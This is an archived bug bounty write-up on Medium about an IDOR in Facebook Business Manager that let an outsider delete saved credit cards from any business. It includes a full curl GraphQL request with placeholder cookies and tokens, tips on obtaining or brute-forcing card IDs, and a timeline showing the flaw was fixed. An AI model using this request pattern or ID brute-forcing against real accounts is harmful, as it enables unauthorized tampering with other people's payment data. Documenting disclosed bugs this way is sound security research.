---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-05_idor-delete-saved-credit-cards-from-any-business-manager-account-facebook-bug-bo.md
original_filename: 2020-06-05_idor-delete-saved-credit-cards-from-any-business-manager-account-facebook-bug-bo.md
title: '[IDOR] Delete saved credit cards from any Business Manager Account — Facebook
  Bug Bounty'
category: documents
detected_topics:
- sso
- idor
- command-injection
- otp
- rate-limit
- graphql
tags:
- imported
- documents
- sso
- idor
- command-injection
- otp
- rate-limit
- graphql
language: en
raw_sha256: b22c927fc86266053ac7b5e04bd27e98965cd914d02d3851795579969636ae01
text_sha256: c05df44cfb72f2daf828530da23946e203f300fe4ee0321160299b2978f43130
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: true
---

# [IDOR] Delete saved credit cards from any Business Manager Account — Facebook Bug Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-05_idor-delete-saved-credit-cards-from-any-business-manager-account-facebook-bug-bo.md
- Source Type: markdown
- Detected Topics: sso, idor, command-injection, otp, rate-limit, graphql
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: True
- Raw SHA256: `b22c927fc86266053ac7b5e04bd27e98965cd914d02d3851795579969636ae01`
- Text SHA256: `c05df44cfb72f2daf828530da23946e203f300fe4ee0321160299b2978f43130`


## Content

---
title: "[IDOR] Delete saved credit cards from any Business Manager Account — Facebook Bug Bounty"
url: "https://medium.com/@rohitcoder/idor-delete-saved-credit-cards-from-any-business-manager-account-f28c773982eb"
authors: ["Rohit kumar (@rohitcoder)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR"]
publication_date: "2020-06-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4527
scraped_via: "browseros"
---

# [IDOR] Delete saved credit cards from any Business Manager Account — Facebook Bug Bounty

[IDOR] Delete saved credit cards from any Business Manager Account — Facebook Bug Bounty
Rohit kumar
Follow
2 min read
·
Jun 5, 2020

95

Business manager is having an option to add and manage credit cards. However, this functionality is limited to authorized “Admins” of that particular Business.

In this report, I will demonstrate how it’s possible to delete saved credit cards, without having an admin or any role in that Victim’s Business.

Press enter or click to view image in full size

Impact
===
Victim’s Business Operations could be affected, by any attacker by removing all saved credit cards, which will result in termination of all Ads run by Victim’s Business on facebook.

Setup
===
Users: USER A, USER B; USER A is Admin of “Business A”, USER B is Admin of “Business B”

Victim — “USER A & BUSINESS A”
Attacker — “USER B & Business B”

Description:

Add credit card from “USER A” account in “Business A” using this link — https://business.facebook.com/settings/payment-methods/?business_id=BUSINESS_ID

Steps
==
1. Now, from USER B account (USER B isn’t associated with BUSINESS A)
2. For performing this attack, you need a Business ID & CREDIT Card ID.
3. Send a POST request to https://business.facebook.com/api/graphql/ with these Variables {“biz_id”:”BUSINESS_ID_HERE”,”fs_id”:CREDIT_CARD_ID} on ***REDACTED-SUSPECT-TOKEN***For more information please have a look at this attached CURL Request.

Get Rohit kumar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

curl ‘https://business.facebook.com/api/graphql/' -H ‘authority: business.facebook.com’ -H ‘origin: https://business.facebook.com/' -H ‘sec-fetch-dest: empty’ -H ‘user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36’ -H ‘dnt: 1’ -H ‘content-type: application/x-www-form-urlencoded’ -H ‘accept: */*’ -H ‘sec-fetch-site: same-origin’ -H ‘sec-fetch-mode: cors’ -H ‘accept-language: en-GB,en-US;q=0.9,en;q=0.8’ -H ‘cookie: BROWSER_COOKIE_HERE’ — data ‘av=100005595064283&__user=100005595064283&__a=1&__dyn=DYN_TOKEN_HERE&__csr=&__req=p&__beoa=0&__pc=PHASED%3Abrands_pkg&dpr=1&__rev=1001776419&__s=veodst%3Auavjgo%3Avwvt5b&__hsi=6799248542192993611–0&__comet_req=0&fb_dtsg=FB_DTSG_TOKEN&jazoest=22122&__spin_r=1001776419&__spin_b=trunk&__spin_t=1583073414&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=RemoveFundingSourceButtonV2CCMutation&variables=%7B%22biz_id%22%3A%22BUSINESS_ID_HERE%22%2C%22fs_id%22%3ACREDIT_CARD_ID%7D&doc_id=2073258542777671’ — compressed

4. Run this request, and Credit card is removed from any Business!

How can we get the Business ID & Credit Card ID?
===
How to Get a Credit Card ID? — There are multiple ways to get Credit card id:

1. If you were the admin of Business A in the past and someone removed you from Business a — You can get this business ID from your browsing history of the Business manager. Generally, You can get Credit card ID from this URL -https://business.facebook.com/settings/payment-methods/CREDIT_CARD_ID?business_id=BUSINESS_ID

2. Another way is just Brute-force Credit Card ID.

Timeline:

Reported : 2 March 2020

Clarifications & Discussion: 4th March 2020 to 26th March 2020

Pre-Triaged & Triaged: 8 April 2020

Fixed: 14 April 2020

Bounty Issued: 16 April 2020
